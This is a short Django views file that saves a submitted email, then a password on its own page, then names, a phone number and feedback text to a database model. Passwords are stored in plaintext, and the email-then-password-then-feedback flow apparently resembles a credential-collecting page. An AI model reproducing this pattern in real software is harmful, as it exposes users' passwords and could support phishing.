from django.shortcuts import render

# Create your views here.
from django.http import HttpResponse,HttpResponseRedirect
from django.urls import reverse
from django.template import loader
from .models import App

def Application(request):
	if request.method == "POST":
		y = request.POST["email"]
		obj = App(email=y)
		obj.save()
		 
	template = loader.get_template('feedback.html')
	return HttpResponse(template.render({},request))

def feedbackpagepass(request):
	if request.method == "POST":
		x = request.POST["password"]
		obj1 = App(passwords=x)
		obj1.save()
		
	template = loader.get_template('feedbackpass.html')
	return HttpResponse(template.render({},request))

def feedbackpage(request):
	if request.method == "POST":
		a = request.POST["firstname"]
		b = request.POST["lastname"]
		c = request.POST["number"]
		d = request.POST["textarea"]
		obj2 = App(firstname=a,lastname=b,phonenumber=c,text=d)
		obj2.save()
	template = loader.get_template('feedbackpage.html')
	return HttpResponse(template.render({},request))

def thankyou(request):
	template = loader.get_template('thankyou.html')
	return HttpResponse(template.render({},request))
